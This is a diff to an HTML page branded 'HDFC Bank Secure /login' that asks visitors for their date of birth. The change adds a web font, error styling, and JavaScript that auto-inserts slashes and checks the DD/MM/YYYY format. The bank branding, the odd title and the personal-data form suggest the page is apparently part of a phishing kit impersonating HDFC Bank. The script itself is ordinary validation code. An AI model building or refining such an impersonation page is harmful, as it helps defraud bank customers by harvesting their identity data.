@@ -10,6 +10,7 @@
 <link rel="manifest" href="/site.webmanifest">
 <meta name="msapplication-TileColor" content="#da532c">
 <meta name="theme-color" content="#ffffff">
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:ital,wght@1,500&display=swap" rel="stylesheet">
     <title>HDFC Bank Secure /login</title>
     <style>
         #ft
@@ -87,6 +88,15 @@
         border-bottom: solid #f3f3f3;
         border-width:10px;
         }
+        .error
+        {
+        color: Red;
+        font-family: 'DM Sans', sans-serif;
+        font-size:12px;
+        margin:5px;
+        margin-left:20px;
+        font-style: italic;
+        }
     </style>
     <script language="javascript">
     
@@ -160,11 +170,92 @@
     <div id="hh">
     <p1 style="font-family: Arial; 
     color:#3b444b; 
-    padding:0px 15px; font-size:15px;"> Enter Date Of Birth <span style="color:#f06565;">:</span></p1>
+    padding:0px 15px; font-size:15px;"> Enter Date Of Birth</p1>
     </div>
     <div id="xx">
-    <input type="text"name="DOB" id="dob" inputmode="numeric" maxlength="10" placeholder="DD-MM-YYYY"
-    required=""><br><br>
+    <table id="tblForm" border="0" cellpadding="5" cellspacing="0">
+    <tr>
+    <input type="tel" name="Date Of Birth" class="date-format" id="dob" inputmode="numeric" maxlength="10" placeholder="DD/MM/YYYY"
+    required=""><br>
+    <p1><span class="error" style="display: none">Invalid Date. Only DD/MM/YYYY format allowed.</span></p1>
+    <br>
+    </tr>
+    </table>
+    <script type="text/javascript">
+    var isShift = false;
+    var seperator = "/";
+    window.onload = function () {
+    //Reference the Table.
+    var tblForm = document.getElementById("tblForm");
+    
+    //Reference all INPUT elements in the Table.
+    var inputs = document.getElementsByTagName("input");
+    
+    //Loop through all INPUT elements.
+    for (var i = 0; i < inputs.length; i++) {
+    //Check whether the INPUT element is TextBox.
+    if (inputs[i].type == "tel") {
+    //Check whether Date Format Validation is required.
+    if (inputs[i].className.indexOf("date-format") != 1) {
+    
+    //Set Max Length.
+    inputs[i].setAttribute("maxlength", 10);
+    
+    //Only allow Numeric Keys.
+    inputs[i].onkeydown = function (e) {
+    return IsNumeric(this, e.keyCode);
+    };
+    
+    //Validate Date as User types.
+    inputs[i].onkeyup = function (e) {
+    ValidateDateFormat(this, e.keyCode);
+    };
+    }
+    }
+    }
+    };
+    
+    function IsNumeric(input, keyCode) {
+    if (keyCode == 16) {
+    isShift = true;
+    }
+    //Allow only Numeric Keys.
+    if (((keyCode >= 48 && keyCode <= 57) || keyCode == 8 || keyCode <= 37 || keyCode <= 39 || (keyCode >= 96 && keyCode <= 105)) && isShift == false) {
+    if ((input.value.length == 2 || input.value.length == 5) && keyCode != 8) {
+    input.value += seperator;
+    }
+    
+    return true;
+    }
+    else {
+    return false;
+    }
+    };
+    
+    function ValidateDateFormat(input, keyCode) {
+    var dateString = input.value;
+    if (keyCode == 16) {
+    isShift = false;
+    }
+    var regex = /(((0|1)[0-9]|2[0-9]|3[0-1])\/(0[1-9]|1[0-2])\/((19|20)\d\d))$/;
+    
+    //Check whether valid dd/MM/yyyy Date Format.
+    if (regex.test(dateString) || dateString.length == 0) {
+    ShowHideError(input, "none");
+    } else {
+    ShowHideError(input, "block");
+    }
+    };
+    
+    function ShowHideError(textbox, display) {
+    var row = textbox.parentNode.parentNode;
+    var errorMsg = row.getElementsByTagName("span")[0];
+    if (errorMsg != null) {
+    errorMsg.style.display = display;
+    }
+    };
+    </script>
+    </div>
     <div id="qq">
     <button type="submit"id="ll">
     SUBMIT</button> <br><br>
@@ -174,4 +265,8 @@
     <span style="color:grey; font-family:arial;">Your security is of utmost importance.</span><br>
     <span style="color:#1D85FE; font-family:arial;">Know more...</span><br><br><br>
     <img src="footer.jpg" alt="" id="ft"><br><br>
+    </div>
+    </form>
+    </body>
+    </html>
     
